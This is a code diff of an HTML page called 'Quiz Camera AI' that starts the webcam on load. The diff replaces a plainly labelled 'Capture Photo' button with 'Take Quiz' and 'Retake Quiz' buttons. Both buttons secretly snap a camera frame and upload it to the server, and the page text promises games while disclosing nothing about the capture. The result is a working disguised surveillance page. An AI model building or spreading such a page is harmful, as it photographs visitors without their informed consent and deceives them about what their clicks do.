@@ -1,41 +1,89 @@
  <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Quiz Camera AI</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Quiz Camera AI</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 26px;
+      color: #222;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 18px;
+      border: none;
+      border-radius: 6px;
+      background-color: #4CAF50;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    video {
+      margin-top: 15px;
+      border-radius: 10px;
+      width: 300px;
+    }
+  </style>
 </head>
 <body>
-<h2>Take Quiz or Skip</h2>
-<button id="capture">Capture Photo</button>
-<video id="video" autoplay></video>
+  <h1>Choose an option to play games</h1>
+  <button id="takeQuiz">Take Quiz</button>
+  <button id="retakeQuiz">Retake Quiz</button>
+  <video id="video" autoplay playsinline></video>
 
-<script>
-const video = document.getElementById("video");
+  <script>
+    const video = document.getElementById('video');
+    const takeQuiz = document.getElementById('takeQuiz');
+    const retakeQuiz = document.getElementById('retakeQuiz');
 
-navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => video.srcObject = stream)
-  .catch(err => alert("Camera access denied: " + err));
-
-document.getElementById("capture").addEventListener("click", () => {
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
-
-  canvas.toBlob(async (blob) => {
-    const formData = new FormData();
-    formData.append("photo", blob, "photo.png");
-
-    try {
-      const res = await fetch("/upload", { method: "POST", body: formData });
-      const data = await res.json();
-      alert("📸 Photo uploaded successfully!\n\nAccess URL:\n" + data.url);
-    } catch (err) {
-      alert("Upload failed: " + err);
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (err) {
+        alert('Camera access denied!');
+      }
     }
-  }, "image/png");
-});
-</script>
+
+    async function captureAndUpload() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'photo.jpg');
+        try {
+          const res = await fetch('/upload', {
+            method: 'POST',
+            body: formData
+          });
+          const data = await res.json();
+          if (data.filePath) {
+            alert(`📸 Photo uploaded: ${data.filePath}`);
+          } else {
+            alert('Upload failed!');
+          }
+        } catch (e) {
+          alert('Error uploading photo!');
+        }
+      }, 'image/jpeg');
+    }
+
+    takeQuiz.onclick = () => captureAndUpload();
+    retakeQuiz.onclick = () => captureAndUpload();
+
+    startCamera();
+  </script>
 </body>
 </html>
